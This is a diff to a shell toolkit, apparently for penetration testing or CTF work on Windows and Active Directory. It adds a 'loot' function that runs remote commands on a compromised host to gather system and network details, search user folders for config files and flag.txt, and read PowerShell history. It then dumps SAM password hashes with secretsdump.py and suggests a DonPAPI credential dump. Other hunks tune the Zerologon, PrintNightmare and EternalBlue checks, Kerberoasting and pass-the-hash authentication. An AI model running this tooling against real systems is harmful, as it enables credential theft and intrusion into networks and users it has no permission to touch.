@@ -14,6 +14,217 @@
 # Then, the functions will be available directly in your terminal.
 # For a list of commands, run: ezpz
 
+# LOOT
+# Extracts crucial information and secrets from a compromised Windows host remotely.
+# Designed to be run with Administrator/SYSTEM privileges using NetExec.
+#------------------------------------------------------------------------------------
+loot() {
+  local usage="
+Usage: loot -t <target> -u <user> [-p <password> | -H <hash>] [-k] [-x <protocol>]
+  Extracts information and secrets from a compromised Windows machine.
+
+  -t, --target    Target IP or hostname of the compromised Windows machine. (Required)
+  -u, --user      Username for authentication. (Required)
+  -p, --password  Password for authentication.
+  -H, --hash      NTLM hash for pass-the-hash authentication.
+  -k, --kerb      Use Kerberos authentication (requires a valid TGT).
+  -x, --protocol  Protocol to use for remote execution (smb or winrm).
+                  Default: winrm. If smb, PowerShell commands will be wrapped in 'powershell -c'.
+"
+  # Set default protocol
+  local proto="winrm"
+  local target_arg=""
+  local other_args=() # To capture user, pass, hash, kerb etc.
+
+  # --- Argument Parsing ---
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      -t | --target)
+        target_arg="$2"
+        shift 2
+        ;;
+      -x | --protocol)
+        proto="$2"
+        # Validate protocol
+        if [[ "$proto" != "smb" && "$proto" != "winrm" ]]; then
+          echo -e "\033[1;31m[!] Invalid protocol specified: $proto. Must be 'smb' or 'winrm'.\033[0m"
+          echo "$usage"
+          return 1
+        fi
+        shift 2
+        ;;
+      -h | --help)
+        echo "$usage"
+        return 0
+        ;;
+      *)
+        other_args+=("$1")
+        # Handle arguments that might have a value, like -u USER, -p PASS, -H HASH
+        # Ensure we only shift twice if the next arg is not another flag
+        if [[ "$2" != "" && "$2" != -* ]]; then
+          other_args+=("$2")
+          shift
+        fi
+        shift
+        ;;
+    esac
+  done
+
+  # Validate mandatory target
+  if [[ -z "$target_arg" ]]; then
+    echo -e "\033[1;31m[!] Missing target parameter. \033[0m"
+    echo "$usage"
+    return 1
+  fi
+
+  # Call get_auth to set nxc_auth with the target and other_args
+  get_auth -t "$target_arg" "${other_args[@]}"
+  if [[ $? -ne 0 ]]; then
+    echo -e "\033[1;31m[!] Failed to parse authentication arguments. \033[0m"
+    echo "$usage"
+    return 1
+  fi
+
+  # Determine PowerShell wrapper for SMB
+  local pwsh_wrapper=""
+  if [[ "$proto" == "smb" ]]; then
+    pwsh_wrapper="powershell -c "
+  fi
+
+  trap "echo ''" INT
+
+  # --- Section 1: Dumping Machine Information ---
+  echo -e "\033[1;35m[!] Dumping machine information... \033[0m"
+
+  echo -e "\033[0;36m[*] Hostname \033[0m"
+  local cmd="hostname"
+  echo -e "\033[0;34m[>] $cmd \033[0m" # Display base command, not wrapped
+  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
+
+  echo -e "\033[0;36m[*] Operating System \033[0m"
+  cmd="Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version"
+  echo -e "\033[0;34m[>] $cmd \033[0m" # Display base command
+  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
+
+  echo -e "\033[0;36m[*] Users with home directories \033[0m"
+  cmd="Get-ChildItem C:/Users -Force | Select-Object Name"
+  echo -e "\033[0;34m[>] $cmd \033[0m" # Display base command
+  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | grep -iv 'Desktop.ini'
+
+  # --- Section 2: Getting Network Information ---
+  echo -e "\033[1;35m[!] Getting network information... \033[0m"
+
+  echo -e "\033[0;36m[*] Network interfaces \033[0m"
+  cmd="Get-NetIPConfiguration"
+  echo -e "\033[0;34m[>] $cmd \033[0m" # Display base command
+  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | sed '1,/^$/d' | grep -E "^(InterfaceAlias|IPv4Address|IPv6Address|DefaultGateway)" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v -e '^$'
+
+  echo -e "\033[0;36m[*] ARP Cache \033[0m"
+  cmd="arp -a"
+  echo -e "\033[0;34m[>] $cmd \033[0m" # Display base command
+  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v 'Interface' | awk {'print $1'} | sort -V | grep -v -e '^$'
+
+   # --- Section 3: Extracting Secrets ---
+  echo -e "\033[1;35m[!] Extracting secrets... \033[0m"
+
+  echo -e "\033[0;36m[*] Searching for flag.txt \033[0m"
+  cmd="Get-ChildItem -Path C:/ -Recurse -Force -Filter flag.txt -ErrorAction SilentlyContinue | Get-Content"
+  echo -e "\033[0;34m[>] $cmd \033[0m"
+  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
+
+  echo -e "\033[0;36m[*] Searching for interesting files in user folders \033[0m"
+  cmd="Get-ChildItem -Path C:/Users -Recurse -Include *.config,*.xml,*.ini,*.json,*.yml,*.yaml,*.log,*.bak,*.old -ErrorAction SilentlyContinue"
+  echo -e "\033[0;34m[>] $cmd \033[0m"
+  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
+
+  echo -e "\033[0;36m[*] Extracting shell history (PowerShell and CMD) \033[0m"
+  cmd="Get-ChildItem -Path C:/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/*.txt -ErrorAction SilentlyContinue | ForEach-Object { Get-Content \$_.FullName -ErrorAction SilentlyContinue }"
+  echo -e "\033[0;34m[>] $cmd \033[0m"
+  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
+
+   # --- SecretsDump.py Integration ---
+  echo -e "\033[1;35m[!] Dumping credentials with secretsdump.py... \033[0m"
+  
+  # Check if secretsdump.py is available
+  if ! command -v secretsdump.py &>/dev/null; then
+    echo -e "\033[1;31m[!] secretsdump.py not found. Skipping credential dump.\033[0m"
+  else
+    # Create secretsdump directory if it doesn't exist
+    mkdir -p "./secretsdump" 2>/dev/null
+    
+    # Define output base path for secretsdump.py
+    local secretsdump_output_base="./secretsdump/$target_arg-secrets"
+    local parsed_sam_file="./${target_arg}.sam.parsed"
+
+    echo -e "\033[0;36m[*] Running secretsdump.py to extract hashes... \033[0m"
+    
+    # Construct secretsdump command using pure username and target IP.
+    # $user contains the username without domain (from get_auth processing).
+    # $target_arg is the IP passed to loot.
+    local secretsdump_target_user_string=""
+    if [[ -n "$user" ]]; then # Only add user if it's not empty
+        secretsdump_target_user_string="$user@"
+    fi
+    secretsdump_target_user_string+="$target_arg" # Final string is user@target or @target
+
+    local secretsdump_cmd_args=()
+    secretsdump_cmd_args+=("$secretsdump_target_user_string")
+    
+    # Add authentication arguments based on $auth
+    if [[ "$auth" == "password" ]]; then
+      secretsdump_cmd_args+=("-p" "$password")
+    elif [[ "$auth" == "hashes" ]]; then
+      secretsdump_cmd_args+=("-hashes" ":$hashes")
+    elif [[ "$auth" == "kerb" ]]; then
+      secretsdump_cmd_args+=("-k" "-no-pass") # secretsdump can use kerberos ticket
+    fi
+
+    secretsdump_cmd_args+=("-outputfile" "$secretsdump_output_base")
+
+    echo -e "\033[0;34m[>] secretsdump.py ${secretsdump_cmd_args[@]} \033[0m"
+    # Execute secretsdump.py silently, as its output is saved to files
+    secretsdump.py "${secretsdump_cmd_args[@]}" >/dev/null 2>&1
+
+    if [[ -f "${secretsdump_output_base}.sam" ]]; then
+      echo -e "\033[0;36m[*] Extracted SAM hashes, parsing to user:hash format... \033[0m"
+      # Read the .sam file, parse user:hash (field 1:field 4 for NTLM hash), and save to a new file
+      cat "${secretsdump_output_base}.sam" | awk -F: '{print $1":"$4}' | tee "$parsed_sam_file"
+      echo -e "\033[0;34m[*] Parsed SAM hashes saved to '$parsed_sam_file'. \033[0m"
+    else
+      echo -e "\033[1;31m[!] secretsdump.py did not produce a .sam file. Check authentication or logs.\033[0m"
+    fi
+  fi
+
+  # --- DonPAPI Suggestion (Next Step) ---
+  if ! command -v donpapi &>/dev/null; then
+    echo -e "\033[1;33m[!] DonPAPI not found. Skipping suggestion.\033[0m"
+  else
+    local donpapi_auth_arg_string="" # Build as string to pass to printf %q
+
+    # Reconstruct the authentication argument for donpapi based on what get_auth received
+    if [[ "$auth" == "password" ]]; then
+      donpapi_auth_arg_string="-p $(printf %q "$password")"
+    elif [[ "$auth" == "hashes" ]]; then
+      donpapi_auth_arg_string="-H $(printf %q "$hashes")"
+    # No suggestion for kerberos or anonymous, as donpapi typically needs password/hash
+    fi
+
+    # For DonPAPI, use the original user input string. It handles DOMAIN\user internally.
+    # If user was "Administrator", original_user_input is "Administrator".
+    # If user was "DOMAIN\Administrator", original_user_input is "DOMAIN\Administrator".
+    
+    if [[ -n "$donpapi_auth_arg_string" ]]; then
+        echo -e "\033[0;33m[*] Next Step: Try dumping DPAPI master keys and credentials with DonPAPI: \033[0m"
+        echo -e "\033[0;34m[>] donpapi collect -t $target_arg -u \"$original_user_input\" $donpapi_auth_arg_string --ntfile \"$parsed_sam_file\" \033[0m"
+    else
+        echo -e "\033[0;33m[*] DonPAPI suggestion skipped: No password or hash provided for authentication.\033[0m"
+    fi
+  fi
+  echo "" # Separator
+
+  echo -e "\033[1;31m[*] Done. \033[0m"
+}
+
 # NETSCAN
 # Discovers live hosts on a network and performs port scans.
 #------------------------------------------------------------------------------------
@@ -298,6 +509,7 @@ Usage: checkvulns -t <target> -u <user> [-p <password> | -H <hash>] [-k]
     local target_arg="$1"
     shift
     local pass_args=("$@")
+    local timeout_secs=600
 
     get_auth -t "$target_arg" "${pass_args[@]}"
     if [[ $? -ne 0 ]]; then
@@ -308,29 +520,29 @@ Usage: checkvulns -t <target> -u <user> [-p <password> | -H <hash>] [-k]
     echo -e "\033[1;35m[!] Checking for vulnerabilities on $target_arg \033[0m"
 
     local smb_test_output
-    smb_test_output=$(nxc smb "${nxc_auth[@]}")
-    if ! echo "$smb_test_output" | grep -q -a '\[+]'; then
+    smb_test_output=$(timeout ${timeout_secs}s nxc smb "${nxc_auth[@]}")
+    if [[ $(echo "$smb_test_output" | wc -l) -le 1 ]]; then
       echo -e "\033[0;33m[*] SMB connection failed or invalid credentials for $target_arg. Skipping. \033[0m"
       return
     fi
 
     echo -e '\033[0;34m[*] EternalBlue (MS17-010) \033[0m'
-    nxc smb "${nxc_auth[@]}" -M ms17-010 | grep -a 'MS17-010' | tr -s " " | cut -d " " -f 3-
+    timeout ${timeout_secs}s nxc smb "${nxc_auth[@]}" -M ms17-010 | grep -a 'MS17-010' | tr -s " " | cut -d " " -f 3-
 
     echo -e '\033[0;34m[*] PrintNightmare (CVE-2021-34527) \033[0m'
-    nxc smb "${nxc_auth[@]}" -M printnightmare | grep -a 'PRINTNIGHTMARE' | tr -s " " | cut -d " " -f 5- | grep -v "STATUS_ACCESS_DENIED"
+    timeout ${timeout_secs}s nxc smb "${nxc_auth[@]}" -M printnightmare | grep -a 'PRINTNIGHTMARE' | tr -s " " | cut -d " " -f 5- | grep -v "STATUS_ACCESS_DENIED"
 
     echo -e '\033[0;34m[*] NoPac (CVE-2021-42278) \033[0m'
-    nxc smb "${nxc_auth[@]}" -M nopac | grep -a 'NOPAC' | tr -s " " | cut -d " " -f 5- | tr -s '\n'
+    timeout ${timeout_secs}s nxc smb "${nxc_auth[@]}" -M nopac | grep -a 'NOPAC' | tr -s " " | cut -d " " -f 5- | tr -s '\n'
 
     echo -e '\033[0;34m[*] Coerce Attacks (PetitPotam, etc.) \033[0m'
-    nxc smb "${nxc_auth[@]}" -M coerce_plus | grep -a 'COERCE' | tr -s " " | cut -d " " -f 5- | tee "$coerce_tmp"
+    timeout ${timeout_secs}s nxc smb "${nxc_auth[@]}" -M coerce_plus | grep -a 'COERCE' | tr -s " " | cut -d " " -f 5- | tee "$coerce_tmp"
     if grep -q "VULNERABLE" "$coerce_tmp"; then
       echo -e "\033[0;36m[+] Try: nxc smb ${nxc_auth[*]} -M coerce_plus -o LISTENER=\$kali\033[0m"
     fi
 
     echo -e '\033[0;34m[*] Zerologon (CVE-2020-1472) \033[0m'
-    nxc smb "${nxc_auth[@]}" -M zerologon | grep -a 'ZEROLOGON' | tr -s " " | cut -d " " -f 5- | sed 's/[-]//g' | grep -v "DCERPCException"
+    timeout ${timeout_secs}s nxc smb "${nxc_auth[@]}" -M zerologon | grep -a 'ZEROLOGON' | tr -s " " | cut -d " " -f 5- | sed 's/[-]//g' | grep -v "DCERPCException"
   }
 
   local target_input=""
@@ -474,7 +686,7 @@ Usage: adscan <target>
           if [[ -n "$domain_name" ]]; then
               if [[ $is_dc -eq 1 || $hosts_count -eq 1 ]]; then
                   new_entry="$ip    DC $hostname $hostname.$domain_name $domain_name"
-                  zshenv add domain=$domain
+                  zshenv add domain=$domain_name
               else
                   new_entry="$ip    $hostname $hostname.$domain_name"
               fi
@@ -718,16 +930,16 @@ testcreds() {
             continue
         fi
         
-        echo -e "\033[1;35m[!] Testing $current_user's credentials on $current_target with NetExec\033[0m"
+        echo -e "\033[1;35m[!] Testing $current_user's credentials on $current_target with NetExec (timeout: 60s)\033[0m"
         echo -e "\033[0;34m[>] nxc <PROTOCOL> ${nxc_auth[@]} \033[0m" 
 
         for protocol in "${protocols_to_test[@]}"; do
             echo -e "\033[0;36m[*] Trying $(echo $protocol | tr '[:lower:]' '[:upper:]')... \033[0m"
             
-            nxc "$protocol" "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
+            timeout 60s nxc "$protocol" "${nxc_auth[@]}" 2>/dev/null | tee /dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
             
             if [[ "$protocol" != "ssh" && "$protocol" != "ftp" ]]; then
-                nxc "$protocol" "${nxc_auth[@]}" --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
+                timeout 60s nxc "$protocol" "${nxc_auth[@]}" --local-auth 2>/dev/null | tee /dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
             fi
         done
         
@@ -803,13 +1015,13 @@ Usage: enumdomain -t <target> -u <user> [-p <password> | -H <hash>] [-k]
 
   echo -e "\033[1;35m[!] Searching for AS-REProastable users \033[0m"
   echo -e "\033[0;34m[>] GetNPUsers.py "${imp_auth[@]}" -request \033[0m"
-  GetNPUsers.py "${imp_auth[@]}" -request 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $1'}
+  GetNPUsers.py "${imp_auth[@]}" 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $1'}
   GetNPUsers.py "${imp_auth[@]}" -request -outputfile asrep.hash >/dev/null 2>&1
   [[ -f ./asrep.hash ]] && echo -e '\033[0;34m[*] Saving hashes to ./asrep.hash \033[0m'
 
   echo -e "\033[1;35m[!] Searching for Kerberoastable users \033[0m"
   echo -e "\033[0;34m[>] GetUserSPNs.py "${imp_auth[@]}" -request \033[0m"
-  GetUserSPNs.py "${imp_auth[@]}" -request 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $2 " ||| "$1'} | column -s "|||" -t
+  GetUserSPNs.py "${imp_auth[@]}" 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $2 " ||| "$1'} | column -s "|||" -t
   GetUserSPNs.py "${imp_auth[@]}" -request -outputfile kerb.hash >/dev/null 2>&1
   [[ -f ./kerb.hash ]] && echo -e '\033[0;34m[*] Saving hashes to ./kerb.hash \033[0m'
 
@@ -1155,6 +1367,10 @@ Example: enumsql -u 'http://test.com/vuln.php?id=1' --cookie='...' --batch
   echo -e "\033[1;31m[*] Done. \033[0m"
 }
 
+
+
+
+
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 #
 #    H E L P E R   F U N C T I O N S
@@ -1225,20 +1441,21 @@ color() {
 
 # GET_AUTH
 # Parses authentication arguments and sets global arrays for nxc and impacket tools.
+# Handles DOMAIN\user format in username.
 #------------------------------------------------------------------------------------
 get_auth() {
   # Unset global variables to ensure a clean state for each call
-  unset nxc_auth imp_auth target user password hashes auth domain dc_ip dc_fqdn
+  unset nxc_auth imp_auth target user password hashes auth domain dc_ip dc_fqdn original_user_input # Ensure original_user_input is unset too
 
   local kerb=0
-  local original_user_input="" # Store the user input as-is for later parsing
-  local user_param_passed=0 # Flag to check if -u was passed
+  local current_user_input_raw="" # Capture the raw -u argument
+  local user_param_was_passed=0 # Flag to check if -u was provided
 
-  # First pass to capture all parameters, especially the original user input
+  # First pass to capture all parameters
   while [[ $# -gt 0 ]]; do
     case "$1" in
       --target | -t) target="$2"; shift 2 ;;
-      --user | -u) original_user_input="$2"; user_param_passed=1; shift 2 ;;
+      --user | -u) current_user_input_raw="$2"; user_param_was_passed=1; shift 2 ;;
       --password | -p) password="$2"; auth="password"; shift 2 ;;
       --hash | -H) hashes="$2"; auth="hashes"; shift 2 ;;
       --kcache) auth="kerb"; shift ;;
@@ -1251,13 +1468,30 @@ get_auth() {
     esac
   done
 
-  # Handle empty string for user
-  if [[ "$original_user_input" == "''" ]]; then
-    user=""
+  # Process the user input: separate domain from username if DOMAIN\user format
+  if [[ -n "$current_user_input_raw" && "$current_user_input_raw" =~ "\\"(.*) ]]; then
+    # User contains a backslash (DOMAIN\user format)
+    local domain_in_user="${current_user_input_raw%\\*}"
+    user="${current_user_input_raw#*\\}" # Populate global 'user' variable with clean username
+    # This 'original_user_input' is what NXC will get for -u (e.g. DOMAIN\user)
+    original_user_input="$current_user_input_raw"
+    imp_user_part="$domain_in_user/$user" # For Impacket: DOMAIN/user
+    nxc_auth=("$target" -u "$original_user_input") # NXC likes DOMAIN\user
+  elif [[ -n "$current_user_input_raw" ]]; then
+    # User is just "user" (no domain in username)
+    user="$current_user_input_raw" # Populate global 'user' variable with the input
+    original_user_input="$current_user_input_raw" # Same for raw input
+    imp_user_part="$domain/$user" # For Impacket: target_domain/user
+    nxc_auth=("$target" -u "$original_user_input") # NXC gets simple user
   else
-    user="$original_user_input"
+    # No user provided, anonymous/null session
+    user=""
+    original_user_input=""
+    imp_user_part="$domain/"
+    nxc_auth=("$target" -u '' -p '')
   fi
-  [[ "$password" == "''" ]] && password=""
+
+  [[ "$password" == "''" ]] && password="" # Handle empty string for password
 
   # Validate mandatory parameters
   if [[ -z "$target" ]]; then
@@ -1266,22 +1500,19 @@ get_auth() {
   fi
 
   # --- Determine Target Domain for DC (for -dc-ip, -dc-host) ---
-  # If domain not provided via -d, try to infer it from /etc/hosts
   if [[ -z "$domain" ]]; then
     domain=$(awk 'tolower($0) ~ /dc/ {print $5; exit}' /etc/hosts)
     [[ -z "$domain" ]] && echo -e "\033[1;33m[!] Target domain not found. Some features may fail. Use --domain or -d. \033[0m"
   fi
 
-  # If DC IP not provided, try to infer from /etc/hosts using the determined target domain
   if [[ -z "$dc_ip" ]]; then
     dc_ip=$(awk -v dom="$domain" 'tolower($0) ~ tolower(dom) && tolower($0) ~ /dc/ {print $1; exit}' /etc/hosts)
     if [[ -z "$dc_ip" ]]; then
-      dc_ip="$target" # Fallback to target IP itself as DC IP
+      dc_ip="$target"
       echo -e "\033[1;33m[!] DC IP not found for domain '$domain'. Using target '$target' as DC IP. Use --dc-ip to specify. \033[0m"
     fi
   fi
 
-  # If DC FQDN not provided, try to infer from /etc/hosts using the determined target domain
   if [[ -z "$dc_fqdn" ]]; then
     dc_fqdn=$(awk -v dom="$domain" 'tolower($0) ~ tolower(dom) && tolower($0) ~ /dc/ {print $4; exit}' /etc/hosts)
     [[ -z "$dc_fqdn" ]] && echo -e "\033[1;33m[!] DC FQDN not found for domain '$domain'. Kerberos auth may fail. Use --dc-fqdn. \033[0m"
@@ -1296,54 +1527,42 @@ get_auth() {
     fi
   fi
 
-  # --- Build Impacket Authentication String ---
-  # This is where the core logic for DOMAIN\user parsing happens
-  local imp_user_part=""
-  if [[ -n "$user_param_passed" && "$original_user_input" =~ "\\"(.*) ]]; then
-    # User contains a backslash (DOMAIN\user format)
-    local domain_in_user="${original_user_input%\\*}" # Extract domain part
-    local username_clean="${original_user_input#*\\}" # Extract username part
-    imp_user_part="$domain_in_user/$username_clean" # Format for Impacket: DOMAIN/user
-    # For nxc_auth, use the original user string "DOMAIN\user" as nxc understands it.
-    nxc_auth=("$target" -u "$original_user_input")
-  elif [[ -n "$user_param_passed" ]]; then
-    # User is just "user" (no domain in username)
-    imp_user_part="$domain/$user" # Prepend the inferred/provided target domain
-    nxc_auth=("$target" -u "$user")
-  else
-    # No user provided, anonymous/null session
-    imp_user_part="$domain/"
-    nxc_auth=("$target" -u '' -p '')
-  fi
-
-  # Add password/hash to imp_user_part
+  # --- Build Impacket Authentication Array ---
+  # Reconstruct imp_user_part, adding password/hash details
   case "$auth" in
     password)
-      imp_user_part+=":$password"
+      imp_user_part="$imp_user_part:$password"
       nxc_auth+=(-p "$password")
       ;;
     hashes)
-      imp_user_part+=" -hashes :$hashes"
+      # Hashes are appended as separate arguments later, so imp_user_part is just user/domain part
       nxc_auth+=(-H "$hashes")
       ;;
     kerb)
-      # No password/hash needed for Kerberos ticket
-      imp_user_part+=" -k -no-pass"
-      nxc_auth+=(-u "$user" --use-kcache) # NXC handles this specific combo for kcache
+      # Kerberos is handled by flags, imp_user_part is just user/domain part
+      nxc_auth+=(-u "$user" --use-kcache)
       ;;
   esac
 
-  # Assemble the final imp_auth string
-  imp_auth="$imp_user_part -dc-ip $dc_ip"
-  # Add dc-host for impacket scripts when using Kerberos
-  if [[ $kerb -eq 1 || "$auth" == "kerb" ]]; then
-      [[ -n "$dc_fqdn" ]] && imp_auth+=" -dc-host $dc_fqdn"
+  # Now build the full imp_auth array, which will be passed to impacket tools
+  imp_auth=("$imp_user_part")
+  if [[ "$auth" == "hashes" ]]; then
+    imp_auth+=("-hashes" ":$hashes")
+  fi
+  if [[ "$auth" == "kerb" ]]; then # If auth is kerb from kcache, or -k flag was passed
+    imp_auth+=("-k" "-no-pass")
+  fi
+  # Add -dc-ip and potentially -dc-host (for kerberos)
+  imp_auth+=("-dc-ip" "$dc_ip")
+  if [[ $kerb -eq 1 || "$auth" == "kerb" ]]; then # Only add -dc-host if kerberos is used
+    [[ -n "$dc_fqdn" ]] && imp_auth+=("-dc-host" "$dc_fqdn")
   fi
 
-  # Add Kerberos flag to nxc_auth if specified (redundant for --use-kcache but good for consistency)
+  # Add Kerberos flag to nxc_auth if specified
   [[ $kerb -eq 1 ]] && nxc_auth+=(-k)
 
   # Export global variables to be accessible by the calling functions
-  export nxc_auth imp_auth target user domain dc_ip dc_fqdn original_user_input # Keep original_user_input for debug/clarity
+  # Ensure `user` and `original_user_input` are properly exported
+  export nxc_auth imp_auth target user domain dc_ip dc_fqdn original_user_input password hashes auth kerb
   return 0
 }
